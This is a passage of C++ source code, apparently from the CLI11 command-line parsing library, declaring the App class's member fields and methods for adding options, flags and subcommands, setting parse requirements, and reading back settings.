        /// Footer to put after all options in the help output INHERITABLE
        std::string footer_{};

        /// This is a function that generates a footer to put after all other options in help output
        std::function<std::string()> footer_callback_{};

        /// A pointer to the help flag if there is one INHERITABLE
        Option* help_ptr_{ nullptr };

        /// A pointer to the help all flag if there is one INHERITABLE
        Option* help_all_ptr_{ nullptr };

        /// A pointer to a version flag if there is one
        Option* version_ptr_{ nullptr };

        /// This is the formatter for help printing. Default provided. INHERITABLE (same pointer)
        std::shared_ptr<FormatterBase> formatter_{ new Formatter() };

        /// The error message printing function INHERITABLE
        std::function<std::string(const App*, const Error& e)> failure_message_{ FailureMessage::simple };

        ///@}
        /// @name Parsing
        ///@{

        using missing_t = std::vector<std::pair<detail::Classifier, std::string>>;

        /// Pair of classifier, string for missing options. (extra detail is removed on returning from parse)
        ///
        /// This is faster and cleaner than storing just a list of strings and reparsing. This may contain the -- separator.
        missing_t missing_{};

        /// This is a list of pointers to options with the original parse order
        std::vector<Option*> parse_order_{};

        /// This is a list of the subcommands collected, in order
        std::vector<App*> parsed_subcommands_{};

        /// this is a list of subcommands that are exclusionary to this one
        std::set<App*> exclude_subcommands_{};

        /// This is a list of options which are exclusionary to this App, if the options were used this subcommand should
        /// not be
        std::set<Option*> exclude_options_{};

        /// this is a list of subcommands or option groups that are required by this one, the list is not mutual,  the
        /// listed subcommands do not require this one
        std::set<App*> need_subcommands_{};

        /// This is a list of options which are required by this app, the list is not mutual, listed options do not need the
        /// subcommand not be
        std::set<Option*> need_options_{};

        ///@}
        /// @name Subcommands
        ///@{

        /// Storage for subcommand list
        std::vector<App_p> subcommands_{};

        /// If true, the program name is not case-sensitive INHERITABLE
        bool ignore_case_{ false };

        /// If true, the program should ignore underscores INHERITABLE
        bool ignore_underscore_{ false };

        /// Allow options or other arguments to fallthrough, so that parent commands can collect options after subcommand.
        /// INHERITABLE
        bool fallthrough_{ false };

        /// Allow subcommands to fallthrough, so that parent commands can trigger other subcommands after subcommand.
        bool subcommand_fallthrough_{ true };

        /// Allow '/' for options for Windows like options. Defaults to true on Windows, false otherwise. INHERITABLE
        bool allow_windows_style_options_{
    #ifdef _WIN32
            true
    #else
            false
    #endif
        };
        /// specify that positional arguments come at the end of the argument sequence not inheritable
        bool positionals_at_end_{ false };

        enum class startup_mode : char { stable, enabled, disabled };
        /// specify the startup mode for the app
        /// stable=no change, enabled= startup enabled, disabled=startup disabled
        startup_mode default_startup{ startup_mode::stable };

        /// if set to true the subcommand can be triggered via configuration files INHERITABLE
        bool configurable_{ false };

        /// If set to true positional options are validated before assigning INHERITABLE
        bool validate_positionals_{ false };

        /// If set to true optional vector arguments are validated before assigning INHERITABLE
        bool validate_optional_arguments_{ false };

        /// indicator that the subcommand is silent and won't show up in subcommands list
        /// This is potentially useful as a modifier subcommand
        bool silent_{ false };

        /// indicator that the subcommand should allow non-standard option arguments, such as -single_dash_flag
        bool allow_non_standard_options_{ false };

        /// Counts the number of times this command/subcommand was parsed
        std::uint32_t parsed_{ 0U };

        /// Minimum required subcommands (not inheritable!)
        std::size_t require_subcommand_min_{ 0 };

        /// Max number of subcommands allowed (parsing stops after this number). 0 is unlimited INHERITABLE
        std::size_t require_subcommand_max_{ 0 };

        /// Minimum required options (not inheritable!)
        std::size_t require_option_min_{ 0 };

        /// Max number of options allowed. 0 is unlimited (not inheritable)
        std::size_t require_option_max_{ 0 };

        /// A pointer to the parent if this is a subcommand
        App* parent_{ nullptr };

        /// The group membership INHERITABLE
        std::string group_{ "SUBCOMMANDS" };

        /// Alias names for the subcommand
        std::vector<std::string> aliases_{};

        ///@}
        /// @name Config
        ///@{

        /// Pointer to the config option
        Option* config_ptr_{ nullptr };

        /// This is the formatter for help printing. Default provided. INHERITABLE (same pointer)
        std::shared_ptr<Config> config_formatter_{ new ConfigTOML() };

        ///@}

#ifdef _WIN32
    /// When normalizing argv to UTF-8 on Windows, this is the storage for normalized args.
        std::vector<std::string> normalized_argv_{};

        /// When normalizing argv to UTF-8 on Windows, this is the `char**` value returned to the user.
        std::vector<char*> normalized_argv_view_{};
#endif

        /// Special private constructor for subcommand
        App(std::string app_description, std::string app_name, App* parent);

    public:
        /// @name Basic
        ///@{

        /// Create a new program. Pass in the same arguments as main(), along with a help string.
        explicit App(std::string app_description = "", std::string app_name = "")
            : App(app_description, app_name, nullptr) {
            set_help_flag("-h,--help", "Print this help message and exit");
        }

        App(const App&) = delete;
        App& operator=(const App&) = delete;

        /// virtual destructor
        virtual ~App() = default;

        /// Convert the contents of argv to UTF-8. Only does something on Windows, does nothing elsewhere.
        CLI11_NODISCARD char** ensure_utf8(char** argv);

        /// Set a callback for execution when all parsing and processing has completed
        ///
        /// Due to a bug in c++11,
        /// it is not possible to overload on std::function (fixed in c++14
        /// and backported to c++11 on newer compilers). Use capture by reference
        /// to get a pointer to App if needed.
        App* callback(std::function<void()> app_callback) {
            if (immediate_callback_) {
                parse_complete_callback_ = std::move(app_callback);
            }
            else {
                final_callback_ = std::move(app_callback);
            }
            return this;
        }

        /// Set a callback for execution when all parsing and processing has completed
        /// aliased as callback
        App* final_callback(std::function<void()> app_callback) {
            final_callback_ = std::move(app_callback);
            return this;
        }

        /// Set a callback to execute when parsing has completed for the app
        ///
        App* parse_complete_callback(std::function<void()> pc_callback) {
            parse_complete_callback_ = std::move(pc_callback);
            return this;
        }

        /// Set a callback to execute prior to parsing.
        ///
        App* preparse_callback(std::function<void(std::size_t)> pp_callback) {
            pre_parse_callback_ = std::move(pp_callback);
            return this;
        }

        /// Set a name for the app (empty will use parser to set the name)
        App* name(std::string app_name = "");

        /// Set an alias for the app
        App* alias(std::string app_name);

        /// Remove the error when extras are left over on the command line.
        App* allow_extras(bool allow = true) {
            allow_extras_ = allow;
            return this;
        }

        /// Remove the error when extras are left over on the command line.
        App* required(bool require = true) {
            required_ = require;
            return this;
        }

        /// Disable the subcommand or option group
        App* disabled(bool disable = true) {
            disabled_ = disable;
            return this;
        }

        /// silence the subcommand from showing up in the processed list
        App* silent(bool silence = true) {
            silent_ = silence;
            return this;
        }

        /// allow non standard option names
        App* allow_non_standard_option_names(bool allowed = true) {
            allow_non_standard_options_ = allowed;
            return this;
        }

        /// Set the subcommand to be disabled by default, so on clear(), at the start of each parse it is disabled
        App* disabled_by_default(bool disable = true) {
            if (disable) {
                default_startup = startup_mode::disabled;
            }
            else {
                default_startup = (default_startup == startup_mode::enabled) ? startup_mode::enabled : startup_mode::stable;
            }
            return this;
        }

        /// Set the subcommand to be enabled by default, so on clear(), at the start of each parse it is enabled (not
        /// disabled)
        App* enabled_by_default(bool enable = true) {
            if (enable) {
                default_startup = startup_mode::enabled;
            }
            else {
                default_startup =
                    (default_startup == startup_mode::disabled) ? startup_mode::disabled : startup_mode::stable;
            }
            return this;
        }

        /// Set the subcommand callback to be executed immediately on subcommand completion
        App* immediate_callback(bool immediate = true);

        /// Set the subcommand to validate positional arguments before assigning
        App* validate_positionals(bool validate = true) {
            validate_positionals_ = validate;
            return this;
        }

        /// Set the subcommand to validate optional vector arguments before assigning
        App* validate_optional_arguments(bool validate = true) {
            validate_optional_arguments_ = validate;
            return this;
        }

        /// ignore extras in config files
        App* allow_config_extras(bool allow = true) {
            if (allow) {
                allow_config_extras_ = config_extras_mode::capture;
                allow_extras_ = true;
            }
            else {
                allow_config_extras_ = config_extras_mode::error;
            }
            return this;
        }

        /// ignore extras in config files
        App* allow_config_extras(config_extras_mode mode) {
            allow_config_extras_ = mode;
            return this;
        }

        /// Do not parse anything after the first unrecognized option (if true) all remaining arguments are stored in
        /// remaining args
        App* prefix_command(bool is_prefix = true) {
            prefix_command_ = is_prefix;
            return this;
        }

        /// Ignore case. Subcommands inherit value.
        App* ignore_case(bool value = true);

        /// Allow windows style options, such as `/opt`. First matching short or long name used. Subcommands inherit
        /// value.
        App* allow_windows_style_options(bool value = true) {
            allow_windows_style_options_ = value;
            return this;
        }

        /// Specify that the positional arguments are only at the end of the sequence
        App* positionals_at_end(bool value = true) {
            positionals_at_end_ = value;
            return this;
        }

        /// Specify that the subcommand can be triggered by a config file
        App* configurable(bool value = true) {
            configurable_ = value;
            return this;
        }

        /// Ignore underscore. Subcommands inherit value.
        App* ignore_underscore(bool value = true);

        /// Set the help formatter
        App* formatter(std::shared_ptr<FormatterBase> fmt) {
            formatter_ = fmt;
            return this;
        }

        /// Set the help formatter
        App* formatter_fn(std::function<std::string(const App*, std::string, AppFormatMode)> fmt) {
            formatter_ = std::make_shared<FormatterLambda>(fmt);
            return this;
        }

        /// Set the config formatter
        App* config_formatter(std::shared_ptr<Config> fmt) {
            config_formatter_ = fmt;
            return this;
        }

        /// Check to see if this subcommand was parsed, true only if received on command line.
        CLI11_NODISCARD bool parsed() const { return parsed_ > 0; }

        /// Get the OptionDefault object, to set option defaults
        OptionDefaults* option_defaults() { return &option_defaults_; }

        ///@}
        /// @name Adding options
        ///@{

        /// Add an option, will automatically understand the type for common types.
        ///
        /// To use, create a variable with the expected type, and pass it in after the name.
        /// After start is called, you can use count to see if the value was passed, and
        /// the value will be initialized properly. Numbers, vectors, and strings are supported.
        ///
        /// ->required(), ->default, and the validators are options,
        /// The positional options take an optional number of arguments.
        ///
        /// For example,
        ///
        ///     std::string filename;
        ///     program.add_option("filename", filename, "description of filename");
        ///
        Option* add_option(std::string option_name,
            callback_t option_callback,
            std::string option_description = "",
            bool defaulted = false,
            std::function<std::string()> func = {});

        /// Add option for assigning to a variable
        template <typename AssignTo,
            typename ConvertTo = AssignTo,
            enable_if_t<!std::is_const<ConvertTo>::value, detail::enabler> = detail::dummy>
        Option* add_option(std::string option_name,
            AssignTo& variable,  ///< The variable to set
            std::string option_description = "") {

            auto fun = [&variable](const CLI::results_t& res) {  // comment for spacing
                return detail::lexical_conversion<AssignTo, ConvertTo>(res, variable);
                };

            Option* opt = add_option(option_name, fun, option_description, false, [&variable]() {
                return CLI::detail::checked_to_string<AssignTo, ConvertTo>(variable);
                });
            opt->type_name(detail::type_name<ConvertTo>());
            // these must be actual lvalues since (std::max) sometimes is defined in terms of references and references
            // to structs used in the evaluation can be temporary so that would cause issues.
            auto Tcount = detail::type_count<AssignTo>::value;
            auto XCcount = detail::type_count<ConvertTo>::value;
            opt->type_size(detail::type_count_min<ConvertTo>::value, (std::max)(Tcount, XCcount));
            opt->expected(detail::expected_count<ConvertTo>::value);
            opt->run_callback_for_default();
            return opt;
        }

        /// Add option for assigning to a variable
        template <typename AssignTo, enable_if_t<!std::is_const<AssignTo>::value, detail::enabler> = detail::dummy>
        Option* add_option_no_stream(std::string option_name,
            AssignTo& variable,  ///< The variable to set
            std::string option_description = "") {

            auto fun = [&variable](const CLI::results_t& res) {  // comment for spacing
                return detail::lexical_conversion<AssignTo, AssignTo>(res, variable);
                };

            Option* opt = add_option(option_name, fun, option_description, false, []() { return std::string{}; });
            opt->type_name(detail::type_name<AssignTo>());
            opt->type_size(detail::type_count_min<AssignTo>::value, detail::type_count<AssignTo>::value);
            opt->expected(detail::expected_count<AssignTo>::value);
            opt->run_callback_for_default();
            return opt;
        }

        /// Add option for a callback of a specific type
        template <typename ArgType>
        Option* add_option_function(std::string option_name,
            const std::function<void(const ArgType&)>& func,  ///< the callback to execute
            std::string option_description = "") {

            auto fun = [func](const CLI::results_t& res) {
                ArgType variable;
                bool result = detail::lexical_conversion<ArgType, ArgType>(res, variable);
                if (result) {
                    func(variable);
                }
                return result;
                };

            Option* opt = add_option(option_name, std::move(fun), option_description, false);
            opt->type_name(detail::type_name<ArgType>());
            opt->type_size(detail::type_count_min<ArgType>::value, detail::type_count<ArgType>::value);
            opt->expected(detail::expected_count<ArgType>::value);
            return opt;
        }

        /// Add option with no description or variable assignment
        Option* add_option(std::string option_name) {
            return add_option(option_name, CLI::callback_t{}, std::string{}, false);
        }

        /// Add option with description but with no variable assignment or callback
        template <typename T,
            enable_if_t<std::is_const<T>::value&& std::is_constructible<std::string, T>::value, detail::enabler> =
            detail::dummy>
        Option* add_option(std::string option_name, T& option_description) {
            return add_option(option_name, CLI::callback_t(), option_description, false);
        }

        /// Set a help flag, replace the existing one if present
        Option* set_help_flag(std::string flag_name = "", const std::string& help_description = "");

        /// Set a help all flag, replaced the existing one if present
        Option* set_help_all_flag(std::string help_name = "", const std::string& help_description = "");

        /// Set a version flag and version display string, replace the existing one if present
        Option* set_version_flag(std::string flag_name = "",
            const std::string& versionString = "",
            const std::string& version_help = "Display program version information and exit");

        /// Generate the version string through a callback function
        Option* set_version_flag(std::string flag_name,
            std::function<std::string()> vfunc,
            const std::string& version_help = "Display program version information and exit");

    private:
        /// Internal function for adding a flag
        Option* _add_flag_internal(std::string flag_name, CLI::callback_t fun, std::string flag_description);

    public:
        /// Add a flag with no description or variable assignment
        Option* add_flag(std::string flag_name) { return _add_flag_internal(flag_name, CLI::callback_t(), std::string{}); }

        /// Add flag with description but with no variable assignment or callback
        /// takes a constant string,  if a variable string is passed that variable will be assigned the results from the
        /// flag
        template <typename T,
            enable_if_t<std::is_const<T>::value&& std::is_constructible<std::string, T>::value, detail::enabler> =
            detail::dummy>
        Option* add_flag(std::string flag_name, T& flag_description) {
            return _add_flag_internal(flag_name, CLI::callback_t(), flag_description);
        }

        /// Other type version accepts all other types that are not vectors such as bool, enum, string or other classes
        /// that can be converted from a string
        template <typename T,
            enable_if_t<!detail::is_mutable_container<T>::value && !std::is_const<T>::value &&
            !std::is_constructible<std::function<void(int)>, T>::value,
            detail::enabler> = detail::dummy>
        Option* add_flag(std::string flag_name,
            T& flag_result,  ///< A variable holding the flag result
            std::string flag_description = "") {

            CLI::callback_t fun = [&flag_result](const CLI::results_t& res) {
                using CLI::detail::lexical_cast;
                return lexical_cast(res[0], flag_result);
                };
            auto* opt = _add_flag_internal(flag_name, std::move(fun), std::move(flag_description));
            return detail::default_flag_modifiers<T>(opt);
        }

        /// Vector version to capture multiple flags.
        template <typename T,
            enable_if_t<!std::is_assignable<std::function<void(std::int64_t)>&, T>::value, detail::enabler> =
            detail::dummy>
        Option* add_flag(std::string flag_name,
            std::vector<T>& flag_results,  ///< A vector of values with the flag results
            std::string flag_description = "") {
            CLI::callback_t fun = [&flag_results](const CLI::results_t& res) {
                bool retval = true;
                for (const auto& elem : res) {
                    using CLI::detail::lexical_cast;
                    flag_results.emplace_back();
                    retval &= lexical_cast(elem, flag_results.back());
                }
                return retval;
                };
            return _add_flag_internal(flag_name, std::move(fun), std::move(flag_description))
                ->multi_option_policy(MultiOptionPolicy::TakeAll)
                ->run_callback_for_default();
        }

        /// Add option for callback that is triggered with a true flag and takes no arguments
        Option* add_flag_callback(std::string flag_name,
            std::function<void(void)> function,  ///< A function to call, void(void)
            std::string flag_description = "");

        /// Add option for callback with an integer value
        Option* add_flag_function(std::string flag_name,
            std::function<void(std::int64_t)> function,  ///< A function to call, void(int)
            std::string flag_description = "");

#ifdef CLI11_CPP14
        /// Add option for callback (C++14 or better only)
        Option* add_flag(std::string flag_name,
            std::function<void(std::int64_t)> function,  ///< A function to call, void(std::int64_t)
            std::string flag_description = "") {
            return add_flag_function(std::move(flag_name), std::move(function), std::move(flag_description));
        }
#endif

        /// Set a configuration ini file option, or clear it if no name passed
        Option* set_config(std::string option_name = "",
            std::string default_filename = "",
            const std::string& help_message = "Read an ini file",
            bool config_required = false);

        /// Removes an option from the App. Takes an option pointer. Returns true if found and removed.
        bool remove_option(Option* opt);

        /// creates an option group as part of the given app
        template <typename T = Option_group>
        T* add_option_group(std::string group_name, std::string group_description = "") {
            if (!detail::valid_alias_name_string(group_name)) {
                throw IncorrectConstruction("option group names may not contain newlines or null characters");
            }
            auto option_group = std::make_shared<T>(std::move(group_description), group_name, this);
            auto* ptr = option_group.get();
            // move to App_p for overload resolution on older gcc versions
            App_p app_ptr = std::dynamic_pointer_cast<App>(option_group);
            add_subcommand(std::move(app_ptr));
            return ptr;
        }

        ///@}
        /// @name Subcommands
        ///@{

        /// Add a subcommand. Inherits INHERITABLE and OptionDefaults, and help flag
        App* add_subcommand(std::string subcommand_name = "", std::string subcommand_description = "");

        /// Add a previously created app as a subcommand
        App* add_subcommand(CLI::App_p subcom);

        /// Removes a subcommand from the App. Takes a subcommand pointer. Returns true if found and removed.
        bool remove_subcommand(App* subcom);

        /// Check to see if a subcommand is part of this command (doesn't have to be in command line)
        /// returns the first subcommand if passed a nullptr
        App* get_subcommand(const App* subcom) const;

        /// Check to see if a subcommand is part of this command (text version)
        CLI11_NODISCARD App* get_subcommand(std::string subcom) const;

        /// Get a subcommand by name (noexcept non-const version)
        /// returns null if subcommand doesn't exist
        CLI11_NODISCARD App* get_subcommand_no_throw(std::string subcom) const noexcept;

        /// Get a pointer to subcommand by index
        CLI11_NODISCARD App* get_subcommand(int index = 0) const;

        /// Check to see if a subcommand is part of this command and get a shared_ptr to it
        CLI::App_p get_subcommand_ptr(App* subcom) const;

        /// Check to see if a subcommand is part of this command (text version)
        CLI11_NODISCARD CLI::App_p get_subcommand_ptr(std::string subcom) const;

        /// Get an owning pointer to subcommand by index
        CLI11_NODISCARD CLI::App_p get_subcommand_ptr(int index = 0) const;

        /// Check to see if an option group is part of this App
        CLI11_NODISCARD App* get_option_group(std::string group_name) const;

        /// No argument version of count counts the number of times this subcommand was
        /// passed in. The main app will return 1. Unnamed subcommands will also return 1 unless
        /// otherwise modified in a callback
        CLI11_NODISCARD std::size_t count() const { return parsed_; }

        /// Get a count of all the arguments processed in options and subcommands, this excludes arguments which were
        /// treated as extras.
        CLI11_NODISCARD std::size_t count_all() const;

        /// Changes the group membership
        App* group(std::string group_name) {
            group_ = group_name;
            return this;
        }

        /// The argumentless form of require subcommand requires 1 or more subcommands
        App* require_subcommand() {
            require_subcommand_min_ = 1;
            require_subcommand_max_ = 0;
            return this;
        }

        /// Require a subcommand to be given (does not affect help call)
        /// The number required can be given. Negative values indicate maximum
        /// number allowed (0 for any number). Max number inheritable.
        App* require_subcommand(int value) {
            if (value < 0) {
                require_subcommand_min_ = 0;
                require_subcommand_max_ = static_cast<std::size_t>(-value);
            }
            else {
                require_subcommand_min_ = static_cast<std::size_t>(value);
                require_subcommand_max_ = static_cast<std::size_t>(value);
            }
            return this;
        }

        /// Explicitly control the number of subcommands required. Setting 0
        /// for the max means unlimited number allowed. Max number inheritable.
        App* require_subcommand(std::size_t min, std::size_t max) {
            require_subcommand_min_ = min;
            require_subcommand_max_ = max;
            return this;
        }

        /// The argumentless form of require option requires 1 or more options be used
        App* require_option() {
            require_option_min_ = 1;
            require_option_max_ = 0;
            return this;
        }

        /// Require an option to be given (does not affect help call)
        /// The number required can be given. Negative values indicate maximum
        /// number allowed (0 for any number).
        App* require_option(int value) {
            if (value < 0) {
                require_option_min_ = 0;
                require_option_max_ = static_cast<std::size_t>(-value);
            }
            else {
                require_option_min_ = static_cast<std::size_t>(value);
                require_option_max_ = static_cast<std::size_t>(value);
            }
            return this;
        }

        /// Explicitly control the number of options required. Setting 0
        /// for the max means unlimited number allowed. Max number inheritable.
        App* require_option(std::size_t min, std::size_t max) {
            require_option_min_ = min;
            require_option_max_ = max;
            return this;
        }

        /// Set fallthrough, set to true so that options will fallthrough to parent if not recognized in a subcommand
        /// Default from parent, usually set on parent.
        App* fallthrough(bool value = true) {
            fallthrough_ = value;
            return this;
        }

        /// Set subcommand fallthrough, set to true so that subcommands on parents are recognized
        App* subcommand_fallthrough(bool value = true) {
            subcommand_fallthrough_ = value;
            return this;
        }

        /// Check to see if this subcommand was parsed, true only if received on command line.
        /// This allows the subcommand to be directly checked.
        explicit operator bool() const { return parsed_ > 0; }

        ///@}
        /// @name Extras for subclassing
        ///@{

        /// This allows subclasses to inject code before callbacks but after parse.
        ///
        /// This does not run if any errors or help is thrown.
        virtual void pre_callback() {}

        ///@}
        /// @name Parsing
        ///@{
        //
        /// Reset the parsed data
        void clear();

        /// Parses the command line - throws errors.
        /// This must be called after the options are in but before the rest of the program.
        void parse(int argc, const char* const* argv);
        void parse(int argc, const wchar_t* const* argv);

    private:
        template <class CharT> void parse_char_t(int argc, const CharT* const* argv);

    public:
        /// Parse a single string as if it contained command line arguments.
        /// This function splits the string into arguments then calls parse(std::vector<std::string> &)
        /// the function takes an optional boolean argument specifying if the programName is included in the string to
        /// process
        void parse(std::string commandline, bool program_name_included = false);
        void parse(std::wstring commandline, bool program_name_included = false);

        /// The real work is done here. Expects a reversed vector.
        /// Changes the vector to the remaining options.
        void parse(std::vector<std::string>& args);

        /// The real work is done here. Expects a reversed vector.
        void parse(std::vector<std::string>&& args);

        void parse_from_stream(std::istream& input);

        /// Provide a function to print a help message. The function gets access to the App pointer and error.
        void failure_message(std::function<std::string(const App*, const Error& e)> function) {
            failure_message_ = function;
        }

        /// Print a nice error message and return the exit code
        int exit(const Error& e, std::ostream& out = std::cout, std::ostream& err = std::cerr) const;

        ///@}
        /// @name Post parsing
        ///@{

        /// Counts the number of times the given option was passed.
        CLI11_NODISCARD std::size_t count(std::string option_name) const { return get_option(option_name)->count(); }

        /// Get a subcommand pointer list to the currently selected subcommands (after parsing by default, in command
        /// line order; use parsed = false to get the original definition list.)
        CLI11_NODISCARD std::vector<App*> get_subcommands() const { return parsed_subcommands_; }

        /// Get a filtered subcommand pointer list from the original definition list. An empty function will provide all
        /// subcommands (const)
        std::vector<const App*> get_subcommands(const std::function<bool(const App*)>& filter) const;

        /// Get a filtered subcommand pointer list from the original definition list. An empty function will provide all
        /// subcommands
        std::vector<App*> get_subcommands(const std::function<bool(App*)>& filter);

        /// Check to see if given subcommand was selected
        bool got_subcommand(const App* subcom) const {
            // get subcom needed to verify that this was a real subcommand
            return get_subcommand(subcom)->parsed_ > 0;
        }

        /// Check with name instead of pointer to see if subcommand was selected
        CLI11_NODISCARD bool got_subcommand(std::string subcommand_name) const noexcept {
            App* sub = get_subcommand_no_throw(subcommand_name);
            return (sub != nullptr) ? (sub->parsed_ > 0) : false;
        }

        /// Sets excluded options for the subcommand
        App* excludes(Option* opt) {
            if (opt == nullptr) {
                throw OptionNotFound("nullptr passed");
            }
            exclude_options_.insert(opt);
            return this;
        }

        /// Sets excluded subcommands for the subcommand
        App* excludes(App* app) {
            if (app == nullptr) {
                throw OptionNotFound("nullptr passed");
            }
            if (app == this) {
                throw OptionNotFound("cannot self reference in needs");
            }
            auto res = exclude_subcommands_.insert(app);
            // subcommand exclusion should be symmetric
            if (res.second) {
                app->exclude_subcommands_.insert(this);
            }
            return this;
        }

        App* needs(Option* opt) {
            if (opt == nullptr) {
                throw OptionNotFound("nullptr passed");
            }
            need_options_.insert(opt);
            return this;
        }

        App* needs(App* app) {
            if (app == nullptr) {
                throw OptionNotFound("nullptr passed");
            }
            if (app == this) {
                throw OptionNotFound("cannot self reference in needs");
            }
            need_subcommands_.insert(app);
            return this;
        }

        /// Removes an option from the excludes list of this subcommand
        bool remove_excludes(Option* opt);

        /// Removes a subcommand from the excludes list of this subcommand
        bool remove_excludes(App* app);

        /// Removes an option from the needs list of this subcommand
        bool remove_needs(Option* opt);

        /// Removes a subcommand from the needs list of this subcommand
        bool remove_needs(App* app);
        ///@}
        /// @name Help
        ///@{

        /// Set usage.
        App* usage(std::string usage_string) {
            usage_ = std::move(usage_string);
            return this;
        }
        /// Set usage.
        App* usage(std::function<std::string()> usage_function) {
            usage_callback_ = std::move(usage_function);
            return this;
        }
        /// Set footer.
        App* footer(std::string footer_string) {
            footer_ = std::move(footer_string);
            return this;
        }
        /// Set footer.
        App* footer(std::function<std::string()> footer_function) {
            footer_callback_ = std::move(footer_function);
            return this;
        }
        /// Produce a string that could be read in as a config of the current values of the App. Set default_also to
        /// include default arguments. write_descriptions will print a description for the App and for each option.
        CLI11_NODISCARD std::string config_to_str(bool default_also = false, bool write_description = false) const {
            return config_formatter_->to_config(this, default_also, write_description, "");
        }

        /// Makes a help message, using the currently configured formatter
        /// Will only do one subcommand at a time
        CLI11_NODISCARD std::string help(std::string prev = "", AppFormatMode mode = AppFormatMode::Normal) const;

        /// Displays a version string
        CLI11_NODISCARD std::string version() const;
        ///@}
        /// @name Getters
        ///@{

        /// Access the formatter
        CLI11_NODISCARD std::shared_ptr<FormatterBase> get_formatter() const { return formatter_; }

        /// Access the config formatter
        CLI11_NODISCARD std::shared_ptr<Config> get_config_formatter() const { return config_formatter_; }

        /// Access the config formatter as a configBase pointer
        CLI11_NODISCARD std::shared_ptr<ConfigBase> get_config_formatter_base() const {
            // This is safer as a dynamic_cast if we have RTTI, as Config -> ConfigBase
#if CLI11_USE_STATIC_RTTI == 0
            return std::dynamic_pointer_cast<ConfigBase>(config_formatter_);
#else
            return std::static_pointer_cast<ConfigBase>(config_formatter_);
#endif
        }

        /// Get the app or subcommand description
        CLI11_NODISCARD std::string get_description() const { return description_; }

        /// Set the description of the app
        App* description(std::string app_description) {
            description_ = std::move(app_description);
            return this;
        }

        /// Get the list of options (user facing function, so returns raw pointers), has optional filter function
        std::vector<const Option*> get_options(const std::function<bool(const Option*)> filter = {}) const;

        /// Non-const version of the above
        std::vector<Option*> get_options(const std::function<bool(Option*)> filter = {});

        /// Get an option by name (noexcept non-const version)
        CLI11_NODISCARD Option* get_option_no_throw(std::string option_name) noexcept;

        /// Get an option by name (noexcept const version)
        CLI11_NODISCARD const Option* get_option_no_throw(std::string option_name) const noexcept;

        /// Get an option by name
        CLI11_NODISCARD const Option* get_option(std::string option_name) const {
            const auto* opt = get_option_no_throw(option_name);
            if (opt == nullptr) {
                throw OptionNotFound(option_name);
            }
            return opt;
        }

        /// Get an option by name (non-const version)
        Option* get_option(std::string option_name) {
            auto* opt = get_option_no_throw(option_name);
            if (opt == nullptr) {
                throw OptionNotFound(option_name);
            }
            return opt;
        }

        /// Shortcut bracket operator for getting a pointer to an option
        const Option* operator[](const std::string& option_name) const { return get_option(option_name); }

        /// Shortcut bracket operator for getting a pointer to an option
        const Option* operator[](const char* option_name) const { return get_option(option_name); }

        /// Check the status of ignore_case
        CLI11_NODISCARD bool get_ignore_case() const { return ignore_case_; }

        /// Check the status of ignore_underscore
        CLI11_NODISCARD bool get_ignore_underscore() const { return ignore_underscore_; }

        /// Check the status of fallthrough
        CLI11_NODISCARD bool get_fallthrough() const { return fallthrough_; }

        /// Check the status of subcommand fallthrough
        CLI11_NODISCARD bool get_subcommand_fallthrough() const { return subcommand_fallthrough_; }

        /// Check the status of the allow windows style options
        CLI11_NODISCARD bool get_allow_windows_style_options() const { return allow_windows_style_options_; }

        /// Check the status of the allow windows style options
        CLI11_NODISCARD bool get_positionals_at_end() const { return positionals_at_end_; }

        /// Check the status of the allow windows style options
        CLI11_NODISCARD bool get_configurable() const { return configurable_; }

        /// Get the group of this subcommand
        CLI11_NODISCARD const std::string& get_group() const { return group_; }

        /// Generate and return the usage.
        CLI11_NODISCARD std::string get_usage() const {
            return (usage_callback_) ? usage_callback_() + '\n' + usage_ : usage_;
        }

        /// Generate and return the footer.
        CLI11_NODISCARD std::string get_footer() const {
            return (footer_callback_) ? footer_callback_() + '\n' + footer_ : footer_;
        }

        /// Get the required min subcommand value
        CLI11_NODISCARD std::size_t get_require_subcommand_min() const { return require_subcommand_min_; }

        /// Get the required max subcommand value
        CLI11_NODISCARD std::size_t get_require_subcommand_max() const { return require_subcommand_max_; }

        /// Get the required min option value
        CLI11_NODISCARD std::size_t get_require_option_min() const { return require_option_min_; }

        /// Get the required max option value
        CLI11_NODISCARD std::size_t get_require_option_max() const { return require_option_max_; }

        /// Get the prefix command status
        CLI11_NODISCARD bool get_prefix_command() const { return prefix_command_; }

        /// Get the status of allow extras
        CLI11_NODISCARD bool get_allow_extras() const { return allow_extras_; }

        /// Get the status of required
        CLI11_NODISCARD bool get_required() const { return required_; }

        /// Get the status of disabled
        CLI11_NODISCARD bool get_disabled() const { return disabled_; }

        /// Get the status of silence
        CLI11_NODISCARD bool get_silent() const { return silent_; }

        /// Get the status of silence
        CLI11_NODISCARD bool get_allow_non_standard_option_names() const { return allow_non_standard_options_; }

        /// Get the status of disabled
        CLI11_NODISCARD bool get_immediate_callback() const { return immediate_callback_; }

        /// Get the status of disabled by default
        CLI11_NODISCARD bool get_disabled_by_default() const { return (default_startup == startup_mode::disabled); }

        /// Get the status of disabled by default
        CLI11_NODISCARD bool get_enabled_by_default() const { return (default_startup == startup_mode::enabled); }
        /// Get the status of validating positionals
        CLI11_NODISCARD bool get_validate_positionals() const { return validate_positionals_; }
        /// Get the status of validating optional vector arguments
        CLI11_NODISCARD bool get_validate_optional_arguments() const { return validate_optional_arguments_; }

        /// Get the status of allow extras
        CLI11_NODISCARD config_extras_mode get_allow_config_extras() const { return allow_config_extras_; }

        /// Get a pointer to the help flag.
        Option* get_help_ptr() { return help_ptr_; }

        /// Get a pointer to the help flag. (const)
        CLI11_NODISCARD const Option* get_help_ptr() const { return help_ptr_; }

        /// Get a pointer to the help all flag. (const)
        CLI11_NODISCARD const Option* get_help_all_ptr() const { return help_all_ptr_; }

        /// Get a pointer to the config option.
        Option* get_config_ptr() { return config_ptr_; }

        /// Get a pointer to the config option. (const)
        CLI11_NODISCARD const Option* get_config_ptr() const { return config_ptr_; }

        /// Get a pointer to the version option.
        Option* get_version_ptr() { return version_ptr_; }

        /// Get a pointer to the version option. (const)
        CLI11_NODISCARD const Option* get_version_ptr() const { return version_ptr_; }

        /// Get the parent of this subcommand (or nullptr if main app)
        App* get_parent() { return parent_; }

        /// Get the parent of this subcommand (or nullptr if main app) (const version)
        CLI11_NODISCARD const App* get_parent() const { return parent_; }

        /// Get the name of the current app
        CLI11_NODISCARD const std::string& get_name() const { return name_; }

        /// Get the aliases of the current app
        CLI11_NODISCARD const std::vector<std::string>& get_aliases() const { return aliases_; }

        /// clear all the aliases of the current App
        App* clear_aliases() {
            aliases_.clear();
            return this;
        }

        /// Get a display name for an app
